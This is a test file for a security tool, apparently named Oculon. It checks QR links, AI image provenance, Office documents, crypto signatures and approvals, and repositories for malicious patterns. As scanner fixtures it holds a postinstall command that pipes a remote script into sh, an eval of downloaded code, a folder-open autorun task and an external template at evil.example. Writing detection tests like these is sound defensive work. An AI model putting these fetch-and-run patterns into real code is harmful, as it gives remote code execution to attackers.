import assert from 'node:assert/strict';
import { test } from 'node:test';
import { crc32, deflateRawSync, deflateSync } from 'node:zlib';
import { createContext } from '../src/core/context.js';
import { decodeGray } from '../src/core/raster.js';
import { EC, readQr, rsCorrect } from '../src/core/qr.js';
import { docCheck } from '../src/modules/doc.js';
import { imageCheck } from '../src/modules/image.js';
import { qrCheck } from '../src/modules/qrcheck.js';
import { signatureCheck } from '../src/modules/signature.js';
import { sharedEnds } from '../src/modules/poisoning.js';
import { powersOf } from '../src/modules/contract.js';
import { parseRepo, scanText } from '../src/modules/repo.js';
import { approvalsCheck } from '../src/modules/approvals.js';
import { parseMonitorPattern } from '../src/modules/monitor.js';
import { McpServer } from '../src/mcp.js';
import { Oculon } from '../src/index.js';
import { NOW } from './helpers.js';

/** A QR code (version 4, level M) for a parking-payment link, made by a standard encoder. */
const QR_URL_PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAG8AAABvCAYAAADixZ5gAAAAAklEQVR4AewaftIAAAUxSURBVO3BQa4csRXAQFKY+1+Z8ebtZLT7ZxxHgKrsF64jLa5jLa5jLa5jLa5jLa5jffgNlW+r2FF5o2Ko7FQ8URkVQ+VJxY7Kt1XsLK5jLa5jffgDFT+lsqMyKobKqBgqQ2VUDJUdlVGxo/KGyqjYqfgplSeL61iL61gfXlJ5UvGk4qcqdip2KnYqfkrlDZUnFW8srmMtrmN9+D+gMiqeqIyKoTIqhsqoGCqj4jSL61iL61gf/hGVb6t4o2JHZVQMlf8ni+tYi+tYH16q+IaKHZVRMSp2VEbFN1QMlW+o+LbFdazFdawPf0Dl21RGxROVUfFEZVQMlVExVEbFTsVQeaLyNy2uYy2uY334jYq/qeKnVN5QGRVPVEbFUHlS8b+yuI61uI714TdURsVQGRVDZVQMlVGxozIqdiqGyqgYKqNiqOyovFExVN5QGRU7KqPiyeI61uI6lv3CF6iMiicqTyqeqIyKoTIqnqjsVOyovFHxhsqo2Flcx1pcx/rwGyrfoDIqRsUbKjsVOxVDZVQ8qRgqo2JUPFF5ovJTi+tYi+tYH36jYqjsVAyVnYodlZ2KJxU7KjsVb6h8Q8VQGRWjYqiMiieL61iL61gfXqrYqRgqOxWjYqjsqPxUxROVUTFUdlR2KobKTsVQGRWj4o3FdazFdawPf6BiR+VJxVAZFTsqOxVDZVQ8URkVP1UxVJ5UPFEZFUNlVOwsrmMtrmPZL2yo7FTsqPxUxVDZqdhRGRVPVEbFjsqo2FHZqRgq31Cxs7iOtbiO9eEvqPg2lVGxozIqhsqOyqjYURkVOxVDZafiicqoeLK4jrW4jmW/sKGyU/GGypOKb1PZqdhR+baKHZVR8VOL61iL61gf/kDFjsqTih2Vv6liqDypGCqjYkdlVAyVoTIqRsUTlVGxs7iOtbiOZb+wobJT8URlp2JH5UnFUNmpeKIyKnZUdiqGyk7FGypPKnYW17EW17E+/EbFjsqoGCo7FUPlb1J5Q2VU7FTsVOyoPKkYFUPljcV1rMV1rA//BZVRsaPypGKo7KjsVOyojIqhsqMyKobKqBgqTyp2VEbFTsWTxXWsxXWsD39AZVTsqIyKUTFURsVOxVB5Q+XbKp5UDJU3VHZURsXO4jrW4jrWh99QGRVDZVQ8UdlRGRVDZVQ8UXmjYqj8VMUbKqNiR+WNxXWsxXWsD79RMVTeUBkVQ+WnVHYqdlSGyk7FUBkqOxVDZadiqIyKoTIqRsVQebK4jrW4jmW/sKEyKobKk4qhMiqGyk7FUNmpGCpvVAyVUTFURsVQ+YaKHZVR8WRxHWtxHct+4R9QGRVDZVTsqIyKHZVRMVRGxVAZFUNlVAyVUfFEZadiqOxU7CyuYy2uY334DZVvqxgVQ2VUPKkYKqNiR2VU7FQMlVExVJ6ojIqdiqEyKobKk8V1rMV1rA9/oOKnVN5Q2akYKqNiqOxU7KiMilGxUzFUdireqBgqo+LJ4jrW4jrWh5dUnlQ8URkVQ2VUDJVRMVR2Kp5UfIPKGyqjYlQMlVGxs7iOtbiO9eEfqXiiMiqGyhsqo2KojIqhMip2Kt5QGRVD5acW17EW17E+/CMqOxVD5Y2KnYqhMip2KobKqBgqo+INlVGxo/JkcR1rcR3rw0sV31CxozIqhsqoGCpDZVQMlVExVEbFUBkVQ2VHZadip2JHZVQ8WVzHWlzH+vAHVL5NZVSMiqEyKobKTsVQeVIxVH6q4g2VUbGjMip2FtexFtex7BeuIy2uYy2uYy2uYy2uYy2uY/0H4OI76iAPdYkAAAAASUVORK5CYII=', 'base64');
const QR_URL_TEXT = 'https://parking-pay.example-top.xyz/pay?zone=12';

/** Context whose fetch answers by URL and, for JSON-RPC, by method and call data. */
function chainContext(answer: (url: string, body: { method?: string; params?: { to?: string; data?: string }[] | string[] } | null) => unknown) {
  const calls: string[] = [];
  const fetch = (async (input: string | URL | Request, init?: RequestInit) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
    calls.push(url);
    let body = null;
    try { body = init?.body ? JSON.parse(Buffer.from(init.body as Uint8Array).toString('utf8')) : null; } catch {}
    const out = answer(url, body);
    if (out === undefined) return new Response('not found', { status: 404 });
    return new Response(JSON.stringify(out), { status: 200 });
  }) as typeof globalThis.fetch;
  return Object.assign(createContext({ dbPath: ':memory:', fetch, throttle: false, retryDelayMs: 1, now: () => NOW }), { calls });
}
const word = (hex: string) => hex.replace(/^0x/, '').padStart(64, '0');
const abiStr = (s: string) => '0x' + word('20') + word(s.length.toString(16)) + Buffer.from(s).toString('hex').padEnd(64, '0');
const rpc = (result: unknown) => ({ jsonrpc: '2.0', id: 1, result });

test('QR: tables add up, Reed-Solomon fixes errors, a PNG code is read and damage is tolerated', () => {
  // Every version's blocks fill exactly the codewords the grid has room for.
  const raw = (v: number) => { const n = 17 + 4 * v; const a = v === 1 ? 0 : Math.floor(v / 7) + 2; return (n * n - 3 * 64 - 2 * (n - 16) - 31 - (a ? (a * a - 3) * 25 - (a - 2) * 10 : 0) - (v >= 7 ? 36 : 0)) >> 3; };
  for (const [v, levels] of Object.entries(EC)) for (const [ec, groups] of levels) assert.equal(groups.reduce((s, [c, d]) => s + c * (d + ec), 0), raw(Number(v)), `version ${v}`);

  const img = decodeGray(QR_URL_PNG);
  assert.deepEqual(readQr(img), [QR_URL_TEXT]);
  // Paint over a block in the middle (a sticker or a logo): error correction recovers it.
  const dmg = { ...img, data: Uint8Array.from(img.data) };
  const c = Math.floor(img.width / 2);
  for (let y = c - 4; y < c + 4; y++) for (let x = c - 4; x < c + 4; x++) dmg.data[y * img.width + x] = 255 - dmg.data[y * img.width + x]!;
  assert.deepEqual(readQr(dmg), [QR_URL_TEXT]);

  // An all-zero codeword block with two corrupted bytes and 10 EC codewords decodes back to zeros.
  const block = new Array(26).fill(0);
  block[3] = 0x5a; block[17] = 0x11;
  assert.ok(rsCorrect(block, 10));
  assert.ok(block.every((b) => b === 0));
});

test('QR check: the link in the code goes through the URL check', async () => {
  const ctx = chainContext((url) => (url.includes('rdap') ? { events: [{ eventAction: 'registration', eventDate: '2026-11-10T00:00:00Z' }] } : undefined));
  const r = await qrCheck(ctx, QR_URL_PNG, 'meter.png');
  assert.equal(r.result.found, true);
  assert.equal(r.result.kind, 'link');
  assert.equal(r.result.content, QR_URL_TEXT);
  assert.equal(r.result.target.url, QR_URL_TEXT);
  assert.ok(r.provenance.some((p) => p.source === 'oculon-qr'));
  const none = await qrCheck(ctx, decodeBlankPng(), 'blank.png');
  assert.equal(none.result.found, false);
});

/** A 40x40 white PNG. */
function decodeBlankPng(): Buffer {
  const w = 40, h = 40;
  const rows = Buffer.alloc((w + 1) * h, 255);
  for (let y = 0; y < h; y++) rows[y * (w + 1)] = 0;
  const chunk = (t: string, d: Buffer) => { const len = Buffer.alloc(4); len.writeUInt32BE(d.length); const td = Buffer.concat([Buffer.from(t, 'latin1'), d]); const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(td) >>> 0); return Buffer.concat([len, td, crc]); };
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 0;
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', ihdr), chunk('IDAT', deflateSync(rows)), chunk('IEND', Buffer.alloc(0))]);
}

test('image check: C2PA credentials naming AI, Stable Diffusion settings, a camera photo, nothing at all', async () => {
  const ctx = chainContext(() => undefined);
  // JPEG with an APP11 JUMBF segment holding a C2PA claim.
  const claim = Buffer.concat([Buffer.from('jumbc2pa', 'latin1'), Buffer.from('claim_generator', 'latin1'), Buffer.from([0x60 + 21]), Buffer.from('ChatGPT Image/1.0 ok!', 'latin1'), Buffer.from(' c2pa.created http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia ', 'latin1'), Buffer.from([0x06, 0x03, 0x55, 0x04, 0x0a, 0x0c, 0x0b]), Buffer.from('OpenAI, LLC', 'latin1')]);
  const seg = Buffer.concat([Buffer.from('JP', 'latin1'), Buffer.from([0, 1, 0, 0, 0, 1]), claim]);
  const len = Buffer.alloc(2); len.writeUInt16BE(seg.length + 2);
  const jpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xeb]), len, seg, Buffer.from([0xff, 0xd9])]);
  const ai = await imageCheck(ctx, jpeg, 'ai.jpg');
  assert.equal(ai.result.verdict, 'AI generated');
  assert.equal(ai.result.c2pa?.generator, 'ChatGPT Image/1.0 ok!');
  assert.deepEqual(ai.result.c2pa?.signers, ['OpenAI, LLC']);
  assert.match(ai.result.reasons.join(' '), /generative AI/);

  // PNG with the parameters text chunk Stable Diffusion web UIs write.
  const text = Buffer.from('parameters\0a castle on a hill, golden hour\nNegative prompt: blurry\nSteps: 30, Sampler: DPM++ 2M, Model: sdxl_base', 'latin1');
  const chunk = (t: string, d: Buffer) => { const l = Buffer.alloc(4); l.writeUInt32BE(d.length); const td = Buffer.concat([Buffer.from(t, 'latin1'), d]); const c = Buffer.alloc(4); c.writeUInt32BE(crc32(td) >>> 0); return Buffer.concat([l, td, c]); };
  const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', Buffer.alloc(13)), chunk('tEXt', text), chunk('IEND', Buffer.alloc(0))]);
  const sd = await imageCheck(ctx, png, 'sd.png');
  assert.equal(sd.result.verdict, 'AI generated');
  assert.equal(sd.result.generator?.tool, 'Stable Diffusion (sdxl_base)');
  assert.equal(sd.result.generator?.prompt, 'a castle on a hill, golden hour');

  // Nothing: a plain PNG says nothing either way.
  const plain = await imageCheck(ctx, Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', Buffer.alloc(13)), chunk('IEND', Buffer.alloc(0))]), 'plain.png');
  assert.equal(plain.result.verdict, 'no provenance found');
  assert.match(plain.result.notes[0]!, /strip metadata/);
});

/** A minimal ZIP writer for Office test files. */
function zip(files: Record<string, string>): Buffer {
  const parts: Buffer[] = [], central: Buffer[] = [];
  let off = 0;
  for (const [name, text] of Object.entries(files)) {
    const data = Buffer.from(text, 'utf8'), comp = deflateRawSync(data), nm = Buffer.from(name, 'utf8');
    const crc = crc32(data) >>> 0;
    const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(8, 8); lh.writeUInt32LE(crc, 14); lh.writeUInt32LE(comp.length, 18); lh.writeUInt32LE(data.length, 22); lh.writeUInt16LE(nm.length, 26);
    const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(8, 10); ch.writeUInt32LE(crc, 16); ch.writeUInt32LE(comp.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(nm.length, 28); ch.writeUInt32LE(off, 42);
    parts.push(lh, nm, comp); central.push(ch, nm);
    off += 30 + nm.length + comp.length;
  }
  const cd = Buffer.concat(central);
  const end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(central.length / 2, 8); end.writeUInt16LE(central.length / 2, 10); end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
  return Buffer.concat([...parts, cd, end]);
}

test('doc check reads Word and Excel files: macros, remote templates, hidden sheets, metadata, IBANs', async () => {
  const ctx = chainContext(() => undefined);
  const core = '<cp:coreProperties><dc:creator>Finance Dept</dc:creator><cp:lastModifiedBy>j.smith</cp:lastModifiedBy><dcterms:created>2026-10-01T09:00:00Z</dcterms:created><dcterms:modified>2026-11-17T09:00:00Z</dcterms:modified></cp:coreProperties>';
  const docm = zip({
    '[Content_Types].xml': '<Types><Override ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>',
    'word/document.xml': '<w:document><w:body><w:p><w:r><w:t>Invoice 1042. Pay to IBAN GB82 WEST 1234 5698 7654 33</w:t></w:r></w:p></w:body></w:document>',
    'word/vbaProject.bin': 'VBA',
    'word/_rels/settings.xml.rels': '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>',
    'docProps/core.xml': core,
    'docProps/app.xml': '<Properties><Application>Microsoft Office Word</Application></Properties>',
  });
  const d = await docCheck(ctx, docm, 'invoice.docm');
  assert.equal(d.result.type, 'docx');
  assert.equal(d.result.verdict, 'dangerous file');
  const f = d.result.flags.join('\n');
  assert.match(f, /VBA macros/);
  assert.match(f, /attachedTemplate from outside the file \(https:\/\/evil\.example\/t\.dotm\)/);
  assert.match(f, /IBAN GB82 WEST 1234 5698 7654 33 .* not valid/);
  assert.match(f, /last saved by "j\.smith"/);
  assert.equal(d.result.office?.macros, true);
  assert.equal(d.result.metadata.application, 'Microsoft Office Word');

  const xlsx = zip({
    '[Content_Types].xml': '<Types/>',
    'xl/workbook.xml': '<workbook><sheets><sheet name="Invoice" sheetId="1"/><sheet name="calc" sheetId="2" state="veryHidden"/></sheets></workbook>',
    'xl/sharedStrings.xml': '<sst><si><t>Total due</t></si></sst>',
  });
  const x = await docCheck(ctx, xlsx, 'invoice.xlsx');
  assert.equal(x.result.type, 'xlsx');
  assert.deepEqual(x.result.office?.hiddenSheets, ['calc (veryHidden)']);
  assert.equal(x.result.verdict, 'signs of editing');
});

test('signature decoder: unlimited permit to a wallet, Permit2 to a known router, raw hash, give-away listing, seed phrase', async () => {
  const USDC = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48';
  const ctx = chainContext((url, b) => {
    if (b?.method === 'eth_getCode') return rpc('0x');
    if (b?.method === 'eth_call') {
      const p = (b.params as { to?: string; data?: string }[])[0]!;
      if (p.to === USDC && p.data === '0x95d89b41') return rpc(abiStr('USDC'));
      if (p.to === USDC && p.data === '0x313ce567') return rpc('0x' + word('6'));
      return rpc('0x');
    }
    return undefined;
  });
  const permit = await signatureCheck(ctx, JSON.stringify({ primaryType: 'Permit', domain: { name: 'USD Coin', chainId: 1, verifyingContract: USDC }, types: {}, message: { owner: '0x' + '2'.repeat(40), spender: '0x' + '3'.repeat(40), value: (2n ** 256n - 1n).toString(), nonce: 0, deadline: '99999999999' } }));
  assert.equal(permit.result.verdict, 'dangerous signature');
  assert.match(permit.result.allows[0]!, /can take all your USDC/);
  assert.equal(permit.result.parties[0]?.type, 'wallet');

  const p2 = await signatureCheck(ctx, '0x87517c45' + word(USDC) + word('0x000000000022d473030f116ddee9f6b43ac78ba3') + word('ffffffffffffffffffffffffffffffffffffffff') + word('0'));
  assert.equal(p2.result.type, 'Permit2 approve');
  assert.equal(p2.result.parties[0]?.name, 'Uniswap Permit2');

  const hash = await signatureCheck(ctx, '0x' + 'ab'.repeat(32));
  assert.equal(hash.result.kind, 'raw hash');
  assert.equal(hash.result.verdict, 'dangerous signature');

  const me = '0x' + '4'.repeat(40);
  const order = await signatureCheck(ctx, JSON.stringify({ primaryType: 'OrderComponents', domain: { name: 'Seaport', chainId: 1 }, types: {}, message: { offerer: me, offer: [{ itemType: 2, token: '0x' + '5'.repeat(40), identifierOrCriteria: '7', startAmount: '1' }], consideration: [{ itemType: 0, startAmount: '0', recipient: me }, { itemType: 2, token: '0x' + '5'.repeat(40), startAmount: '1', recipient: '0x' + '6'.repeat(40) }] } }));
  assert.equal(order.result.verdict, 'dangerous signature');
  assert.match(order.result.reasons.join(' '), /get nothing back/);

  const seed = await signatureCheck(ctx, 'To restore access, confirm your seed phrase');
  assert.equal(seed.result.verdict, 'dangerous signature');
});

test('approvals: live allowances only, spam events dropped, wallet spenders flagged high', async () => {
  const OWNER = '0x' + 'a'.repeat(40), TOKEN = '0x' + 'b'.repeat(40), SPAM = '0x' + 'c'.repeat(40);
  const DRAINER = '0x' + 'd'.repeat(40), ROUTER = '0x7a250d5630b4cf539739df2c5dacb4c659f2488d';
  process.env.ETHERSCAN_API_KEY ||= 'test';
  const topic = (a: string) => '0x' + word(a);
  const ctx = chainContext((url, b) => {
    if (url.includes('action=getLogs') && url.includes('topic0=0x8c5be1e5')) return { status: '1', message: 'OK', result: [
      { address: TOKEN, topics: ['0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925', topic(OWNER), topic(DRAINER)], data: '0x', blockNumber: '1', timeStamp: '1763000000', transactionHash: '0xsigned' },
      { address: SPAM, topics: ['0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925', topic(OWNER), topic(ROUTER)], data: '0x', blockNumber: '2', timeStamp: '1763000100', transactionHash: '0xspam' },
    ] };
    if (url.includes('action=getLogs')) return { status: '0', message: 'No records found', result: [] };
    if (url.includes('action=txlist')) return { status: '1', message: 'OK', result: [{ hash: '0xsigned', from: OWNER, to: TOKEN, value: '0', timeStamp: '1763000000', isError: '0' }] };
    if (b?.method === 'eth_getCode') return rpc('0x');
    if (b?.method === 'eth_call') {
      const p = (b.params as { to?: string; data?: string }[])[0]!;
      if (p.data?.startsWith('0xdd62ed3e')) return rpc('0x' + 'f'.repeat(64));
      if (p.data === '0x95d89b41') return rpc(abiStr(p.to === TOKEN ? 'GOOD' : 'SPAM'));
      return rpc('0x' + word('12'));
    }
    if (url.includes('sdn') || url.includes('treasury')) return undefined;
    return undefined;
  });
  const r = await approvalsCheck(ctx, OWNER);
  assert.equal(r.result.approvals.length, 1, 'the spam approval to a known router is ignored');
  const a = r.result.approvals[0]!;
  assert.equal(a.symbol, 'GOOD');
  assert.equal(a.spenderType, 'wallet');
  assert.equal(a.risk, 'high');
  assert.equal(r.result.verdict, 'dangerous approvals');
  assert.match(r.result.revokeUrl, /revoke\.cash/);
});

test('helpers: lookalike address ends, owner powers, repo patterns, monitor phrasing', () => {
  assert.deepEqual(sharedEnds('0x1234567890abcdef1234567890abcdef12345678', '0x1234ffffffffffffffffffffffffffffffff5678'), { head: 4, tail: 4 });
  const powers = powersOf(['mint', 'setFees', 'blacklist', 'transfer', 'renounceOwnership', 'upgradeTo']).map((p) => p.power);
  assert.deepEqual(powers, ['can mint new tokens', 'can block wallets (blacklist)', 'can change buy and sell taxes', 'can replace the contract code (upgradeable)']);
  assert.equal(parseRepo('https://github.com/acme/web3-test.git'), 'acme/web3-test');
  const bad = scanText('server/config.js', `const x = 1;\naxios.get(u).then((r) => eval(r.data));\nconst p = "nkbihfbeogaeaoehlefnkodbefgpgknn";`).map((f) => f.what);
  assert.ok(bad.some((w) => /runs code downloaded/.test(w)));
  assert.ok(bad.some((w) => /wallet extension/.test(w)));
  const pkg = scanText('package.json', JSON.stringify({ scripts: { postinstall: 'curl -s https://x.example/i.sh | sh' } }));
  assert.equal(pkg[0]?.severity, 'high');
  const vs = scanText('.vscode/tasks.json', '{"tasks":[{"command":"node .vscode/a.js","runOptions":{"runOn":"folderOpen"}}]}');
  assert.match(vs[0]!.what, /runs by itself when the folder is opened/);
  assert.equal(scanText('src/index.js', 'export const add = (a, b) => a + b;\n').length, 0);
  assert.deepEqual(parseMonitorPattern('alert me about new approvals on 0x1111111111111111111111111111111111111111 on arbitrum'), { kind: 'approvals', target: '0x1111111111111111111111111111111111111111@arbitrum', description: 'new approvals on wallet 0x1111111111111111111111111111111111111111@arbitrum' });
  assert.equal(parseMonitorPattern('watch for a rug pull on 0x2222222222222222222222222222222222222222')?.kind, 'contract');
});

test('MCP lists the new tools with verdict cards', async () => {
  const o = new Oculon({ dbPath: ':memory:', fetch: (async () => new Response('{}', { status: 404 })) as typeof fetch });
  const s = new McpServer(() => o);
  const r = (await s.handle({ jsonrpc: '2.0', id: 1, method: 'tools/list' })) as { result: { tools: { name: string; _meta?: unknown }[] } };
  for (const n of ['oculon_approvals', 'oculon_contract_risk', 'oculon_signature_check', 'oculon_address_poisoning', 'oculon_trace_funds', 'oculon_image_check', 'oculon_qr_check', 'oculon_repo_check', 'oculon_domain_report', 'oculon_wallet_report']) {
    const t = r.result.tools.find((x) => x.name === n);
    assert.ok(t, n);
    assert.ok(t._meta, `${n} has a verdict card`);
  }
});

test('web: QR upload, signature POST, new GET checks are recorded with replay ids', async () => {
  const { createWebServer } = await import('../src/web/server.js');
  const { mockFetch } = await import('./helpers.js');
  const { server, stop } = createWebServer({ port: 0, burnRpcUrl: '', oculon: new Oculon({ dbPath: ':memory:', fetch: mockFetch([]).fetch, throttle: false, now: () => NOW }) });
  await new Promise((r) => server.once('listening', r));
  const base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
  const h = { 'content-type': 'application/json', 'x-oculon': '1' };
  try {
    const qr = (await (await fetch(`${base}/api/qr`, { method: 'POST', headers: h, body: JSON.stringify({ name: 'meter.png', data: QR_URL_PNG.toString('base64') }) })).json()) as { result: { content: string }; check: { id: string } };
    assert.equal(qr.result.content, QR_URL_TEXT);
    assert.ok(qr.check.id);
    const sig = (await (await fetch(`${base}/api/signature`, { method: 'POST', headers: h, body: JSON.stringify({ request: '0x' + 'ab'.repeat(32) }) })).json()) as { result: { verdict: string }; check: { id: string } };
    assert.equal(sig.result.verdict, 'dangerous signature');
    assert.ok(sig.check.id);
    assert.equal((await fetch(`${base}/api/approvals`)).status, 400, 'address is required');
    const img = (await (await fetch(`${base}/api/imagecheck`, { method: 'POST', headers: h, body: JSON.stringify({ name: 'x.png', data: QR_URL_PNG.toString('base64') }) })).json()) as { result: { verdict: string } };
    assert.equal(img.result.verdict, 'no provenance found');
  } finally {
    await stop();
  }
});
